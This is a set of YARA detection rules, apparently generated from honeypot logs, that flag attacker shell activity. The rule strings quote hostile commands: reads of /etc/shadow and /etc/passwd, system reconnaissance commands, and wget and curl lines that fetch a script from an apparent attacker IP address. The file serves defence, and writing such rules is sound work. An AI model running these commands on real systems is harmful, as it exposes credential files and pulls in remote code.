// LLM Honeypot Intelligence Platform - YARA Rules
// Generated: 20260325_1958
// Source: Elasticsearch honeypot data (24h window)

rule Honeypot_CredentialTheft {
    meta:
        description = "LLM Honeypot Intelligence - CredentialTheft pattern detection"
        author = "LLM Honeypot Intelligence Platform"
        date = "2026-03-25"
        source = "honeypot_auto_generated"
        confidence = "high"
        event_count = "2"
        unique_patterns = "2"
    strings:
        $s0 = "cat /etc/shadow 2>/dev/null" ascii nocase
        $s1 = "cat /etc/passwd 2>/dev/null" ascii nocase
    condition:
        any of them
}

rule Honeypot_SystemRecon {
    meta:
        description = "LLM Honeypot Intelligence - SystemRecon pattern detection"
        author = "LLM Honeypot Intelligence Platform"
        date = "2026-03-25"
        source = "honeypot_auto_generated"
        confidence = "high"
        event_count = "1734"
        unique_patterns = "12"
    strings:
        $s0 = "/bin/./uname -s -v -n -r -m" ascii nocase
        $s1 = "cat /proc/cpuinfo" ascii nocase
        $s2 = "dmidecode -s processor-version 2>/dev/null" ascii nocase
        $s3 = "hostname" ascii nocase
        $s4 = "ip route show 2>/dev/null" ascii nocase
        $s5 = "last 2>/dev/null" ascii nocase
        $s6 = "nproc --all" ascii nocase
        $s7 = "uname -a" ascii nocase
        $s8 = "uname -p 2>/dev/null" ascii nocase
        $s9 = "gpu_info=$( (lspci 2>/dev/null" ascii nocase
        $s10 = "echo \"GPU:$gpu_info" ascii nocase
        $s11 = "nproc 2>/dev/null" ascii nocase
    condition:
        any of them
}

rule Honeypot_ToolDownload {
    meta:
        description = "LLM Honeypot Intelligence - ToolDownload pattern detection"
        author = "LLM Honeypot Intelligence Platform"
        date = "2026-03-25"
        source = "honeypot_auto_generated"
        confidence = "high"
        event_count = "4"
        unique_patterns = "2"
    strings:
        $s0 = "wget --no-check-certificate -qO- https://31.57.216.121/sh" ascii nocase
        $s1 = "curl -sk https://31.57.216.121/sh" ascii nocase
    condition:
        any of them
}

rule Honeypot_DataCollection {
    meta:
        description = "LLM Honeypot Intelligence - DataCollection pattern detection"
        author = "LLM Honeypot Intelligence Platform"
        date = "2026-03-25"
        source = "honeypot_auto_generated"
        confidence = "high"
        event_count = "2"
        unique_patterns = "1"
    strings:
        $s0 = "locate D877F783D5D3EF8Cs" ascii nocase
    condition:
        any of them
}